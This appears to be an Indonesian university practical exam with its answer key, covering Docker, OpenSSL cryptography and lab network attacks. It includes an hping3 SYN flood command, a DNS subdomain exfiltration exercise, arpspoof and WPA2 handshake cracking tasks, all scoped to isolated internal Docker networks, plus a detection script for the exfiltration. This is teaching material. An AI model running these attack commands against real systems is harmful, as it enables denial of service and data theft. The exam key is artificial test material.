# UTS Praktik Infrastruktur & Network Attacks (Pertemuan 1–7)

Dokumen ini memuat struktur folder, tata cara, dan seluruh kode untuk UTS praktik berbasis Docker.

> **Peringatan:** Jalankan hanya di lingkungan lab lokal. Jangan memindai atau menyerang host di luar lab.

---

## 1. Struktur Folder

```
uts-network-lab/
├── README.md
├── images/
│   ├── uts-openssl/
│   │   └── Dockerfile
│   ├── uts-kali-tools/
│   │   └── Dockerfile
│   └── uts-dnsmasq/
│       └── Dockerfile
├── b/
│   ├── b1-compose/
│   │   └── docker-compose.yml
│   ├── b3-syn-flood/
│   │   └── docker-compose.yml
│   └── b4-dns-exfil/
│       └── docker-compose.yml
└── kasus/
    ├── k5-scapy/
    │   └── kirim_icmp.py
    └── k9-dns-detect/
        └── analisis_dns.py
```

---

## 2. Persiapan (Sebelum Ujian)

Jaringan Bagian B memakai `internal: true`, sehingga container di dalamnya tidak punya akses internet. Semua paket harus sudah terpasang di image.

```bash
docker build -t uts-openssl images/uts-openssl
docker build -t uts-kali-tools images/uts-kali-tools
docker build -t uts-dnsmasq images/uts-dnsmasq
docker pull alpine
docker pull nginx:alpine
docker pull vulnerables/web-dvwa
docker pull kalilinux/kali-rolling
```

---

## 3. Bagian A: Soal Mudah (5 soal × 10 poin)

### A1. Container dasar dan port mapping

Jalankan container `nginx:alpine` bernama `web-uts` yang memetakan port 8080 di host ke port 80 di container. Tunjukkan output `docker ps`, akses halamannya, lalu tampilkan 5 baris pertama konfigurasi nginx.

```bash
docker run -d --name web-uts -p 8080:80 nginx:alpine
docker ps
curl http://localhost:8080
docker exec web-uts head -n 5 /etc/nginx/nginx.conf
```

### A2. Persistensi volume

Buat volume `data-uts`. Tulis NIM ke `/data/catatan.txt` dari container, hapus container tersebut, lalu baca file dari container baru yang memasang volume yang sama.

```bash
docker volume create data-uts
docker run --name w1 -v data-uts:/data alpine sh -c 'echo NIM > /data/catatan.txt'
docker rm w1
docker run --rm -v data-uts:/data alpine cat /data/catatan.txt
```

### A3. Integritas file dengan hash

Hitung MD5 dan SHA-256, ubah satu karakter, lalu hitung ulang.

```bash
echo 'pesan rahasia' > pesan.txt
md5sum pesan.txt
sha256sum pesan.txt
sed -i 's/pesan/pesaN/' pesan.txt
md5sum pesan.txt
sha256sum pesan.txt
```

### A4. Enkripsi simetris dengan OpenSSL

```bash
openssl enc -aes-256-cbc -pbkdf2 -salt -in pesan.txt -out pesan.enc -pass pass:kunci123
openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:kunci123
openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:salah   # menghasilkan bad decrypt
openssl enc -aes-256-cbc -pbkdf2 -salt -a -in pesan.txt -pass pass:kunci123
```

### A5. Jaringan bridge dan akses antar-container

```bash
docker network create lab-net
docker run -d --name host-a --network lab-net alpine sleep infinity
docker run -d --name host-b --network lab-net alpine sleep infinity
docker run -d --name dvwa --network lab-net vulnerables/web-dvwa
docker exec host-a ping -c 3 host-b
docker exec host-a wget -S -O /dev/null http://dvwa/login.php
```

---

## 4. Bagian B: Soal Medium (4 soal × 12,5 poin)

Semua jaringan di bagian ini memakai `internal: true`.

### B1. Docker Compose multi-container terisolasi

Buat `docker-compose.yml` dengan service `target` (nginx) dan `attacker` (alpine) pada jaringan `lab` yang `internal: true`. Service `target` tidak boleh memiliki `ports`.

Kode: lihat `b/b1-compose/docker-compose.yml` pada Bagian 6.

```bash
cd b/b1-compose
docker compose up -d
docker compose exec attacker wget -qO- http://target
docker compose down -v
```

Jelaskan mengapa `curl http://localhost` dari host tidak bisa mencapai `target`.

### B2. Kriptografi RSA dan sertifikat

Gunakan image `uts-openssl`. Lakukan tiga langkah berikut.

```bash
docker run --rm -it -v "$PWD":/work uts-openssl sh

# di dalam container:
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
echo 'pesan untuk ditandatangani' > pesan.txt
openssl dgst -sha256 -sign priv.pem -out sig.bin pesan.txt
openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt   # Verified OK
echo 'diubah' >> pesan.txt
openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt   # Verification Failure
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj /CN=lab.uts.local
openssl x509 -in cert.pem -noout -subject -issuer -dates
```

Jelaskan dalam dua kalimat perbedaan sertifikat self-signed dan sertifikat yang ditandatangani CA.

### B3. SYN flood dan deteksinya

Kode: lihat `b/b3-syn-flood/docker-compose.yml` pada Bagian 6.

```bash
cd b/b3-syn-flood
docker compose up -d
docker compose exec target netstat -ant | grep -c SYN_RECV
docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose exec target netstat -ant | grep -c SYN_RECV
docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
docker compose down -v
```

Langkah:
1. Catat jumlah SYN_RECV sebelum serangan.
2. Jalankan serangan selama 15 detik.
3. Catat jumlah SYN_RECV saat serangan berlangsung, lalu bandingkan.
4. Jelaskan satu mitigasi, misalnya SYN cookies atau rate limit iptables.

### B4. DNS exfiltration lewat subdomain

Kode: lihat `b/b4-dns-exfil/docker-compose.yml` pada Bagian 6.

```bash
cd b/b4-dns-exfil
docker compose up -d
echo -n NIM-ANDA | xxd -p                                  # hasilnya <hex>
docker compose exec attacker dig +short <hex>.exfil.lab @dns
docker compose logs dns | grep exfil.lab
echo <hex> | xxd -r -p                                     # decode pesan asli
docker compose down -v
```

Jelaskan mengapa teknik ini sulit diblokir firewall biasa, lalu sebutkan satu indikator deteksinya.

---

## 5. Rubrik Penilaian

| Soal | Poin | Kriteria nilai penuh |
| --- | --- | --- |
| A1 | 10 | Container berjalan dengan port 8080 ke 80, `curl` berhasil, `docker exec` menampilkan isi file |
| A2 | 10 | Data tetap ada setelah container dihapus, dibuktikan dari isi file di container baru |
| A3 | 10 | MD5 dan SHA-256 dihitung sebelum dan sesudah perubahan, penjelasan tepat |
| A4 | 10 | Enkripsi dan dekripsi berhasil, error kata sandi salah tampil, output base64 ada |
| A5 | 10 | Ping antar-container dengan nama berhasil, status HTTP DVWA tampil |
| B1 | 12,5 | Compose valid, jaringan `internal: true`, tanpa `ports`, `attacker` mengakses `target` |
| B2 | 12,5 | Kunci RSA dibuat, verifikasi berhasil lalu gagal setelah file diubah, sertifikat terbaca |
| B3 | 12,5 | Jumlah SYN_RECV sebelum dan saat serangan dibandingkan, mitigasi dijelaskan |
| B4 | 12,5 | Hex terkirim sebagai subdomain, log dianalisis, pesan asli berhasil di-decode |
| Total | 100 | |

Pengurangan nilai:
- Output tidak disertakan: kurangi 30 persen dari nilai soal.
- Perintah tidak bisa diulang oleh penguji: kurangi 50 persen dari nilai soal.
- Serangan diarahkan ke host di luar lab atau jaringan tidak memakai `internal: true`: nilai soal 0 dan dilaporkan.

---

## 6. Kode Sumber

### images/uts-openssl/Dockerfile

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache openssl
WORKDIR /work
CMD ["sleep", "infinity"]
```

### images/uts-kali-tools/Dockerfile

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && \
    apt-get install -y --no-install-recommends hping3 dnsutils xxd dsniff aircrack-ng python3 python3-scapy netcat-openbsd tcpdump curl && \
    rm -rf /var/lib/apt/lists/*
WORKDIR /work
CMD ["sleep", "infinity"]
```

### images/uts-dnsmasq/Dockerfile

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache dnsmasq
EXPOSE 53/udp 53/tcp
CMD ["dnsmasq", "-k", "-d", "--no-resolv", "--log-queries", "--log-facility=-", "--address=/exfil.lab/10.0.0.99"]
```

### b/b1-compose/docker-compose.yml

```yaml
services:
  target:
    image: nginx:alpine
    networks: [lab]
  attacker:
    image: alpine
    command: sleep infinity
    networks: [lab]

networks:
  lab:
    internal: true
```

### b/b3-syn-flood/docker-compose.yml

```yaml
services:
  target:
    image: nginx:alpine
    networks: [lab]
  attacker:
    image: uts-kali-tools
    command: sleep infinity
    cap_add: [NET_ADMIN, NET_RAW]
    networks: [lab]

networks:
  lab:
    internal: true
```

### b/b4-dns-exfil/docker-compose.yml

```yaml
services:
  dns:
    image: uts-dnsmasq
    networks: [lab]
  attacker:
    image: uts-kali-tools
    command: sleep infinity
    networks: [lab]

networks:
  lab:
    internal: true
```

### kasus/k5-scapy/kirim_icmp.py

```python
"""Kasus 5: kirim ICMP echo request dengan Scapy dan baca balasannya.

Pemakaian (di dalam lab):
    python3 kirim_icmp.py <ip-target>
"""
import sys

from scapy.all import ICMP, IP, sr1

target = sys.argv[1]
paket = IP(dst=target) / ICMP()
print("Mengirim:", paket.summary())

balasan = sr1(paket, timeout=2, verbose=False)
if balasan is None:
    print("Tidak ada balasan.")
else:
    print("TTL balasan:", balasan[IP].ttl)
    print("Tipe ICMP balasan:", balasan[ICMP].type)
```

Perintah menjalankan:

```bash
docker run --rm -it --network lab-net -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-target>
```

### kasus/k9-dns-detect/analisis_dns.py

```python
"""Kasus 9: deteksi kemungkinan DNS exfiltration dari log dnsmasq.

Pemakaian:
    python3 analisis_dns.py dns.log

Skrip menghitung panjang label dan jumlah query per domain induk,
lalu menandai label yang panjang atau berisi hanya karakter hex.
"""
import re
import sys
from collections import Counter

PAT = re.compile(r"query\[\w+\] (\S+) from")
BATAS_PANJANG_LABEL = 30

jumlah_domain = Counter()
mencurigakan = []

with open(sys.argv[1], encoding="utf-8", errors="ignore") as f:
    for baris in f:
        m = PAT.search(baris)
        if not m:
            continue
        nama = m.group(1).rstrip(".")
        bagian = nama.split(".")
        domain_induk = ".".join(bagian[-2:])
        jumlah_domain[domain_induk] += 1
        label = bagian[0]
        if len(label) > BATAS_PANJANG_LABEL and re.fullmatch(r"[0-9a-fA-F]+", label):
            mencurigakan.append((len(label), nama))

print("Jumlah query per domain induk:")
for domain, n in jumlah_domain.most_common():
    print(f"  {domain}: {n}")

print("\nQuery mencurigakan (label panjang berisi hex):")
for panjang, nama in mencurigakan:
    print(f"  panjang={panjang}  {nama}")
```

Perintah menjalankan:

```bash
docker compose -f b/b4-dns-exfil/docker-compose.yml logs dns > dns.log
python3 kasus/k9-dns-detect/analisis_dns.py dns.log
```

---

## 7. Studi Kasus dan Penentuan Kasus per NIM

### Langkah penentuan kasus

1. Tulis NIM tanpa tanda baca, lalu jumlahkan seluruh digitnya.
2. Hitung sisa bagi jumlah tersebut dengan 10.
3. Jika sisa bagi 0, gunakan Kasus 10. Jika tidak, nomor kasus sama dengan sisa bagi.
4. Lampirkan jumlah digit, sisa bagi, dan nomor kasus di `jawaban.md`.

### Contoh NIM 19552011024

- Digit: 1, 9, 5, 5, 2, 0, 1, 1, 0, 2, 4.
- Jumlah digit: 1+9+5+5+2+0+1+1+0+2+4 = 30.
- Sisa bagi: 30 mod 10 = 0, sehingga NIM tersebut mendapat Kasus 10.

Setiap kasus mencakup seluruh materi Pertemuan 1 sampai 7 dengan bobot poin yang sama. Kasus hanya berbeda pada parameter lab (lihat tabel), sehingga semua mahasiswa diuji pada materi dan tingkat kesulitan yang setara.

**Tujuh tugas wajib (dikerjakan di setiap kasus, bobot sama)**

1. Pertemuan 1 (Docker): buat volume, buktikan data tetap ada setelah container dihapus, lalu jalankan compose dengan dua service.
2. Pertemuan 2 (Kriptografi): enkripsi laporan dengan AES-256, hitung SHA-256 sebelum dan sesudah dekripsi, lalu periksa sertifikat self-signed.
3. Pertemuan 3 (ARP): catat tabel ARP sebelum dan sesudah arpspoof, tunjukkan MAC yang berubah, lalu jelaskan satu mitigasi.
4. Pertemuan 4 (Wireless): analisis handshake WPA2 dari file capture yang disediakan dengan aircrack-ng.
5. Pertemuan 5 (ICMP): kirim ICMP echo dengan Scapy dan jelaskan smurf attack.
6. Pertemuan 6 (TCP): ukur jumlah SYN_RECV saat SYN flood dan tangkap three-way handshake dengan tcpdump.
7. Pertemuan 7 (DNS): kirim pesan NIM dalam bentuk hex sebagai subdomain, lalu deteksi dengan skrip analisis log.

**Parameter per kasus**

| Kasus | Container target | Volume | File laporan | Kata sandi enkripsi | Domain exfiltrasi |
| --- | --- | --- | --- | --- | --- |
| 1 | target-k1 | vol-k1 | laporan-k1.txt | kunci-k1-2026 | k1.exfil.lab |
| 2 | target-k2 | vol-k2 | laporan-k2.txt | kunci-k2-2026 | k2.exfil.lab |
| 3 | target-k3 | vol-k3 | laporan-k3.txt | kunci-k3-2026 | k3.exfil.lab |
| 4 | target-k4 | vol-k4 | laporan-k4.txt | kunci-k4-2026 | k4.exfil.lab |
| 5 | target-k5 | vol-k5 | laporan-k5.txt | kunci-k5-2026 | k5.exfil.lab |
| 6 | target-k6 | vol-k6 | laporan-k6.txt | kunci-k6-2026 | k6.exfil.lab |
| 7 | target-k7 | vol-k7 | laporan-k7.txt | kunci-k7-2026 | k7.exfil.lab |
| 8 | target-k8 | vol-k8 | laporan-k8.txt | kunci-k8-2026 | k8.exfil.lab |
| 9 | target-k9 | vol-k9 | laporan-k9.txt | kunci-k9-2026 | k9.exfil.lab |
| 10 | target-k10 | vol-k10 | laporan-k10.txt | kunci-k10-2026 | k10.exfil.lab |

Gunakan nilai pada baris kasus Anda di semua perintah. Pesan yang dikirim pada Pertemuan 7 adalah NIM Anda sendiri.

---

## 8. Catatan Penguji

- Jaringan Bagian B memakai `internal: true`, sehingga container di dalamnya tidak punya akses internet. Paket harus sudah ada di image sebelum ujian.
- Jalankan semua kunci sekali di lingkungan yang sama sebelum ujian. Pastikan `docker network inspect` menampilkan `Internal: true` untuk jaringan Bagian B.
- Untuk mengurangi contekan, buat dua versi soal dengan mengganti nama container, nama volume, dan kata sandi.
- Kode di dokumen ini belum diuji di Docker. Jalankan dulu sebelum dibagikan.
